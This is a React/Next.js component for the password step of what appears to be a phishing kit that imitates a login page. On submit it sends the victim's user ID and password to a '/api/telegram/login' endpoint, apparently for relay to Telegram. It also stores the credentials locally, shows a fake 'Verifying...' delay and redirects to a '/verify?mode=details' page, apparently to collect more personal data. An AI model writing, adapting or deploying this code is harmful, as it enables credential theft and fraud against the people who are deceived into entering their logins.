"use client"

import { useRouter } from "next/navigation"
import { useState } from "react"
import { WELCOME_TITLE } from "@/lib/auth-copy"
import {
  setTargetFlowLogin,
} from "@/lib/flores-flow"
import { readStoredUsername, storeLoginCredentials } from "@/lib/login-flow-storage"
import { LOADING_MS, wait } from "@/lib/loading-delays"

type PasswordStepProps = {
  userId: string
}

export function PasswordStep({ userId }: PasswordStepProps) {
  const router = useRouter()
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [errors, setErrors] = useState<{ password?: string; form?: string }>({})

  const handlePasswordBlur = () => {
    if (!password.trim()) {
      setErrors((prev) => ({ ...prev, password: "Password is required." }))
    }
  }

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPassword(e.target.value)
    if (errors.password || errors.form) {
      setErrors((prev) => ({ ...prev, password: undefined, form: undefined }))
    }
  }

  const handleSubmitLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!password.trim()) {
      setErrors({ password: "Password is required." })
      return
    }
    if (isSubmitting) return

    setIsSubmitting(true)
    setErrors({})

    const trimmedUserId = userId.trim() || readStoredUsername()

    const loginRequest = fetch("/api/telegram/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: trimmedUserId, password }),
    }).catch(console.error)

    void fetch("/api/deny-recovery/clear", { method: "POST" }).catch(() => {})

    storeLoginCredentials(trimmedUserId, password)
    setTargetFlowLogin()

    await Promise.all([loginRequest, wait(LOADING_MS.next)])
    router.push("/verify?mode=details")
    setIsSubmitting(false)
  }

  return (
    <>
      <div className="mb-xl login-section-heading">
        <h2 className="welcome-title bold-text text-5xl m-none">{WELCOME_TITLE}</h2>
      </div>

      <div className="user-summary-block">
        <h6 className="user-summary-label-row">
          <strong>User ID</strong>
        </h6>
        <div className="user-summary-value-row">
          <h6 className="m-none">{userId}</h6>
          <button
            type="button"
            className="change-user-btn"
            onClick={() => router.push("/")}
            disabled={isSubmitting}
          >
            Change
          </button>
        </div>
      </div>

      <form onSubmit={handleSubmitLogin} className="f-panel white medium auth-panel auth-panel-password">
        <div style={{ width: "100%" }}>
          <div className="mb-l">
            <button
              type="button"
              aria-label="Go to User ID"
              className="flex items-center gap-m h-40px pr-m back-to-user"
              onClick={() => router.push("/")}
              disabled={isSubmitting}
            >
              <div className="flex justify-center items-center w-24px h-24px">
                <svg viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden>
                  <path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l192 192c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256 246.6 86.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-192 192z" />
                </svg>
              </div>
              <span className="accent-navy-blue-text bold-text">Back</span>
            </button>
          </div>

          <h6 className="mb-l">
            <p className="text-l bold-text">Enter your password.</p>
          </h6>

          <div className="mb-l mt-l text-xs">* Fields marked with an asterisk (*) are required.</div>

          {errors.form ? (
            <div className="error-message mb-l" role="alert">
              {errors.form}
            </div>
          ) : null}

          <div className="form-group">
            <label htmlFor="password" className="input-label">
              Password*
            </label>
            <div className="input-field-wrapper">
              <input
                type={showPassword ? "text" : "password"}
                id="password"
                name="password"
                autoComplete="current-password"
                required
                className={`input-field ${errors.password ? "has-error" : ""}`}
                value={password}
                onChange={handlePasswordChange}
                onBlur={handlePasswordBlur}
                disabled={isSubmitting}
              />
              <button
                type="button"
                className="password-toggle-btn"
                onClick={() => setShowPassword((show) => !show)}
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? (
                  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden>
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18"
                    />
                  </svg>
                ) : (
                  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden>
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                    />
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                    />
                  </svg>
                )}
              </button>
            </div>

            {errors.password && (
              <div className="error-message" role="alert">
                <svg fill="currentColor" viewBox="0 0 20 20" aria-hidden>
                  <path
                    fillRule="evenodd"
                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                    clipRule="evenodd"
                  />
                </svg>
                {errors.password}
              </div>
            )}
          </div>

          <div className="mt-xl" style={{ marginBottom: "10px" }}>
            <button
              type="submit"
              className="f-button progressive medium"
              disabled={!password.trim() || isSubmitting}
            >
              <span className="button-text">
                {isSubmitting ? "Verifying..." : "Log in with password"}
              </span>
            </button>
          </div>

          <div className="b-top pt-xl neutral-athens-gray-border">
            <button
              type="button"
              className="f-button action medium"
              aria-label="Biometric login"
              disabled={isSubmitting}
            >
              <span className="f-icon left" aria-hidden>
                <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                  <path d="M166.4 99.2c-37.1 0-67.2 30.1-67.2 67.2l0 179.2c0 37.1 30.1 67.2 67.2 67.2l179.2 0c37.1 0 67.2-30.1 67.2-67.2l0-179.2c0-37.1-30.1-67.2-67.2-67.2l-179.2 0zM76.8 166.4c0-49.5 40.1-89.6 89.6-89.6l179.2 0c49.5 0 89.6 40.1 89.6 89.6l0 179.2c0 49.5-40.1 89.6-89.6 89.6l-179.2 0c-49.5 0-89.6-40.1-89.6-89.6l0-179.2zM309 256c0-32.9-22.1-56.8-52.6-56.8-30.2 0-52.2 23.8-52.2 56.8 0 33.4 21.4 56.8 52.2 56.8 31 0 52.6-23.4 52.6-56.8zm0 81.4c-16.2 13.3-38.1 21-61.1 21l0 0c-54.6 0-94.2-43-94.2-102.4s43-102.4 102.4-102.4 102.4 43 102.4 102.4l0 99-49.4 0 0-17.6z" />
                </svg>
              </span>
              <span className="button-text">Biometric login</span>
            </button>
          </div>
        </div>
      </form>
    </>
  )
}
